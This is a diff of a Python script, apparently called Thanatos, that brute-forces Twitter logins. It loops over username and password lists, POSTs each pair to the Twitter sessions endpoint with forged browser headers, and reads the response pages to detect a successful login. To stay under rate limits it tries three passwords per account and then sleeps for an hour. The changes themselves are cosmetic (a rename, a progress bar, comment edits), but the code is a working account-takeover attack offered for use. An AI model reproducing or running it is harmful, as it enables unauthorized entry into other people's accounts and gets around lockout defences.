@@ -8,13 +8,14 @@
 #         |_|                        
 # By LogicPy
 
-# Frame.py:
+# Thanatos.py:
 
 #Modules
 import requests
 from random import randint
 import time
 from itertools import islice
+from tqdm import tqdm
 
 def banner():
 	print """
@@ -36,7 +37,6 @@ bPlace = 3
 #Main Routine.
 def main():
 
-	#Enable access to variables ANYWHERE
 	global USERNAME
 	global PASSWORD
 	global login_URL
@@ -52,15 +52,15 @@ def main():
 	global uname
 	global pwd
 
-	#Login URL
+	# Login URL
 	login_URL = 'https://twitter.com/sessions'
-	#login_URL redirected to after login_URL containing keyword
+	# POST redirection
 	landing = 'https://twitter.com/'
-	#The keyword that indicates successful login_URL detection
+	# keyword indicates successful login (1)
 	keyword = 'Verify your identity'
-	# Successful Login
+	# keyword indicates successful login (2)
 	keyword2 = 'Add emoji'
-	# Another Successful Login
+	# keyword indicates successful login (3)
 	keyword3 = 'Your account has been locked'
 	# Login Attempt Overload Indicator
 	keyword4 = 'Yikes! We need'
@@ -69,7 +69,7 @@ def main():
 
 main()
 	
-#Used for finding values between tags
+# Used for finding values between tags
 def find_between( s, first, last ):
     try:
         start = s.index( first ) + len( first )
@@ -83,7 +83,6 @@ def processReq():
 	global aPlace
 	global bPlace
 
-	# For usernames
 	text_file = open("list.txt", "r")
 
 	text_file2 = open("pw.txt", "r")
@@ -103,14 +102,13 @@ def processReq():
 				# Password cycle (Only first three words)
 				for p in PASSWORD[aPlace:bPlace]:
 				
-					# Print process
 					uname = u
 					pwd = p
 
 					# 1) Direct to login url. Prepare for POST login
 					c.get(login_URL)
 
-					#POST Login data
+					# POST Login data
 					login_data = \
 					{
 						'session[username_or_email]':uname,
@@ -121,7 +119,7 @@ def processReq():
 						'remember_me':'1'
 					}
 
-					#Header data
+					# Header data
 					header_data = \
 					{
 						'authority':'twitter.com',
@@ -173,10 +171,9 @@ def processReq():
 			# Inc / Resume
 			aPlace = aPlace + 3
 			bPlace = bPlace + 3
-			print "\nCool down...\n"
-			for slptim in range(1,3600):
+			print "\nCool down process initiated...\n"
+			for slptim in tqdm(range(1,3600)):
 				time.sleep(1)
-				print slptim
 
 banner()
 processReq()
